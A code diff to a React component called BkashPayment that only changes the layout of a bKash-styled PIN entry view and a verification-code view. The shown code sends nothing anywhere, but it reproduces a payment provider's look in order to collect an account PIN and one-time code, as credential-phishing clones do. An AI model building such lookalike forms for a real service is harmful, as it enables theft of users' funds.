@@ -350,23 +350,27 @@ const BkashPayment = () => {
             ) : showPinView ? (
               <>
                 {/* Pink Section - PIN Form */}
-                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '340px' }}>
-                  <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
-                    Enter PIN of your bKash account number
-                  </h3>
-                  <p className="text-white text-center text-xs font-medium mb-3 h-4">
-                    ({getMaskedNumber()})
-                  </p>
-                  <input
-                    ref={pinInputRef}
-                    type="text"
-                    autoComplete="off"
-                    value={pinCode}
-                    onChange={handlePinChange}
-                    placeholder="Enter PIN"
-                    className="w-full bg-white rounded px-4 h-[42px] flex items-center justify-center text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden caret-transparent overflow-hidden"
-                    style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '18px' : '14px', letterSpacing: pinCode.length > 0 ? '0.15em' : 'normal', lineHeight: '42px' } as React.CSSProperties}
-                  />
+                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '340px' }}>
+                  {/* Fixed top area for title + input */}
+                  <div className="pt-[90px]">
+                    <h3 className="text-white text-center text-xs font-medium mb-1 h-4">
+                      Enter PIN of your bKash account number
+                    </h3>
+                    <p className="text-white text-center text-xs font-medium mb-3 h-4">
+                      ({getMaskedNumber()})
+                    </p>
+                    <input
+                      ref={pinInputRef}
+                      type="text"
+                      autoComplete="off"
+                      value={pinCode}
+                      onChange={handlePinChange}
+                      placeholder="Enter PIN"
+                      className="w-full bg-white rounded px-4 h-[42px] flex items-center justify-center text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden caret-transparent overflow-hidden"
+                      style={{ WebkitTextSecurity: 'disc', fontSize: pinCode.length > 0 ? '20px' : '14px', letterSpacing: pinCode.length > 0 ? '0.15em' : 'normal', lineHeight: '42px' } as React.CSSProperties}
+                    />
+                  </div>
+                  {/* Warning flows below input without shifting it */}
                   {showPinWarning && (
                     <div className="flex items-center justify-center gap-1.5 mt-2">
                       <span className="text-white text-sm">⚠</span>
@@ -410,45 +414,51 @@ const BkashPayment = () => {
             ) : showOtpView ? (
               <>
                 {/* Pink Section - OTP Form */}
-                <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '340px' }}>
-                  <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
-                    Enter verification code sent to {getMaskedNumber()}
-                  </h3>
-                  <input
-                    ref={otpInputRef}
-                    type="tel"
-                    value={otpCode}
-                    onChange={handleOtpChange}
-                    placeholder="Enter 6 digit code"
-                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
-                  />
-                  {showWrongOtp && (
-                    <div className="flex items-center justify-center gap-1.5 mt-2">
-                      <span className="text-white text-sm">⚠</span>
-                      <span className="text-white text-xs font-medium">Wrong verification code</span>
-                    </div>
-                  )}
-                  {resendStatus === 'sending' ? (
-                    <p className="text-white text-center text-[10px] mt-2">
-                      Sending code to user handset ..
-                    </p>
-                  ) : resendStatus === 'sent' ? (
-                    <>
-                      <p className="text-white text-center text-[10px] mt-2 font-medium">
-                        Code sent successfully
+                <div className="bg-[#E2136E] px-5 flex flex-col" style={{ height: '340px' }}>
+                  {/* Fixed top area for title + input */}
+                  <div className="pt-[100px]">
+                    <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
+                      Enter verification code sent to {getMaskedNumber()}
+                    </h3>
+                    <input
+                      ref={otpInputRef}
+                      type="tel"
+                      value={otpCode}
+                      onChange={handleOtpChange}
+                      placeholder="Enter 6 digit code"
+                      className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
+                    />
+                  </div>
+                  {/* Alerts and resend flow below input */}
+                  <div className="flex flex-col items-center mt-2">
+                    {showWrongOtp && (
+                      <div className="flex items-center justify-center gap-1.5 mb-1">
+                        <span className="text-white text-sm">⚠</span>
+                        <span className="text-white text-xs font-medium">Wrong verification code</span>
+                      </div>
+                    )}
+                    {resendStatus === 'sending' ? (
+                      <p className="text-white text-center text-[10px]">
+                        Sending code to user handset ..
                       </p>
-                      <p className="text-white text-center text-[10px] mt-1">
-                        Resend Code in {resendTimer}s
+                    ) : resendStatus === 'sent' ? (
+                      <>
+                        <p className="text-white text-center text-[10px] font-medium">
+                          Code sent successfully
+                        </p>
+                        <p className="text-white text-center text-[10px] mt-1">
+                          Resend Code in {resendTimer}s
+                        </p>
+                      </>
+                    ) : (
+                      <p 
+                        className={`text-white text-center text-[10px] ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
+                        onClick={handleResendCode}
+                      >
+                        {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
                       </p>
-                    </>
-                  ) : (
-                    <p 
-                      className={`text-white text-center text-[10px] mt-2 ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
-                      onClick={handleResendCode}
-                    >
-                      {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
-                    </p>
-                  )}
+                    )}
+                  </div>
                 </div>
 
                 {/* OTP Action Buttons */}
